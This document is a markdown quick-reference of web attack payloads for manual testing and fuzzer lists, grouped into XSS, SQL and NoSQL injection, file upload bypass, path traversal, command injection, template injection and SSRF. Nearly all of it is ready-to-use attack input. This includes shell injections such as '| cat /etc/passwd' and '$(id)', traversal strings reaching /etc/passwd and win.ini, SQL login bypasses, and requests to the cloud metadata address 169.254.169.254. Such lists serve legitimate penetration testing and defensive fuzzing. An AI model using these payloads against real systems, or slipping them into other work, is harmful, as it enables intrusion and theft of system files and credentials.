# Injection & Exploitation Payloads

Quick-reference payloads grouped by vulnerability class. These are starting
points for manual testing and intruder/fuzzer lists, not a full matrix - see
[payload-reference.md](../testing/payload-reference.md) for the exhaustive
set with reasoning.

## Table of contents

1. [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
2. [SQL Injection (SQLi)](#sql-injection-sqli)
3. [NoSQL Injection](#nosql-injection)
4. [File Upload Bypass](#file-upload-bypass)
5. [Path Traversal](#path-traversal)
6. [Command Injection](#command-injection)
7. [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
8. [Server-Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)

## Cross-Site Scripting (XSS)

### Basic

```text
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><svg/onload=alert(1)>
XSS "><script>alert(1);</script>
```

### Attribute breaking

```text
" onmouseover=alert(1) x="
' onfocus=alert(1) x='
```

### Filter bypass

```text
<ScRiPt>alert(1)</ScRiPt>
<svg><script>alert(1)</script>
<Img Src=OnXSS OnError=(alert)(1)>
```

### DOM

```text
#<img src=x onerror=alert(1)>
"><svg/onload=alert(1)>
javascript:alert(1)
```

### Encoded

```text
%3Cscript%3Ealert(1)%3C/script%3E
&lt;svg onload=alert(1)&gt;
```

## SQL Injection (SQLi)

### Auth bypass

```text
' OR '1'='1
" OR 1=1--
'--
```

### Union / error-based

```text
' UNION SELECT null,null--
```

### Time-based

```text
' AND sleep(5)--
```

### Boolean-blind

```text
' AND 1=1--
' AND 1=2--
```

## NoSQL Injection

```text
{"$ne":null}
{"$gt":""}
```

## File Upload Bypass

```text
shell.php.jpg
shell.phtml
shell.php%00.jpg
Content-Type: image/png
```

## Path Traversal

### Linux

```text
../
../../etc/passwd
....//....//etc/passwd
```

### Filter bypass

```text
..%2f..%2fetc%2fpasswd
..%252f..%252fetc%252fpasswd
..%c0%af..%c0%afetc%c0%afpasswd
```

### Windows

```text
..\..\windows\win.ini
..%5c..%5cwindows%5cwin.ini
```

## Command Injection

### Linux

```text
;id
| whoami
&& whoami
| cat /etc/passwd
$(id)
id
```

### Linux blind

```text
| sleep 5
&& ping -c 2 127.0.0.1
```

## Server-Side Template Injection (SSTI)

```text
{{7*7}}
${7*7}
<%= 7*7 %>
<#assign x=7*7>
```

## Server-Side Request Forgery (SSRF)

```text
http://127.0.0.1/admin
http://127.0.0.1
http://localhost
http://169.254.169.254/
http://169.254.169.254/latest/meta-data/
http://internal-service/admin
```
